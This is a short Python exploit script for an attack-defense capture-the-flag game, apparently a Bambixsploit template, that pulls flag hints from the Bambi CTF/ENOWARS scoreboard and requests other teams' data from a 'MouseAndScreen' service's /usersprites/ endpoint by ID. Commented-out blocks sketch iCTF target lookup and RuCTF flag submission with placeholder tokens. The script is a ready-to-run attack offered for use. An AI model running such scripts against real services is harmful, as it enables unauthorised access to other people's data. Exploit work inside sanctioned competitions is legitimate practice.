#!/usr/bin/env python3

import json
import requests
import sys
from typing import Optional

TARGET = sys.argv[1] # The target's ip address is passed as an command line argument

session = requests.Session()

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint}')
    hint = json.loads(hint)
    foo = session.get(f"http://{TARGET}:5005/usersprites/{hint['spriteId']}")
    print(foo.status_code)
    print(foo.text)


# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).

# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('https://bambi.enoflag.de/scoreboard/attack.json').json()
service_info = attack_info['services']['MouseAndScreen']
team_info = service_info[TARGET] # Get the information for the current target
for round in team_info:
    round_info = team_info[round]
    for flag_store in round_info:
        store_info = round_info[flag_store]
        for flag_info in store_info:
            try:
                exploit(flag_info, flag_store) # flag_info will always be a string, which you might have to parse with json.loads
            except Exception as ex:
                print(ex)
'''
# iCTF flag hints:
t = Team('http://teaminterface.ictf.gg/', 'TODO_INSERT_TEAM_TOKEN_HERE')
targets = t.get_targets(TODO_INSERT_SERVICE_ID_HERE)
for target in targets:
    if target['hostname'] == TARGET:
        pass

# In CTFs that do not publish flag hints you are on your own.
exploit(None, None)
'''


# Bambixsploit can automatically submit flags to the Bambi CTF / ENOWARS flag submission endpoints only, for other CTFs you have to do it yourself.
'''
# RuCTF / STAY ~ CTF submission
SUBMISSION_ADDRESS = 'http://monitor.ructfe.org/flags'
def submit(flag: str):
    headers={'X-Team-Token': 'TODO_INSERT_SECRET_TOKEN_HERE'}
    data='['+flag+']'
    response = requests.put(SUBMISSION_ADDRESS, headers=headers, data=data)
    print(response)
    print(response.content)
'''
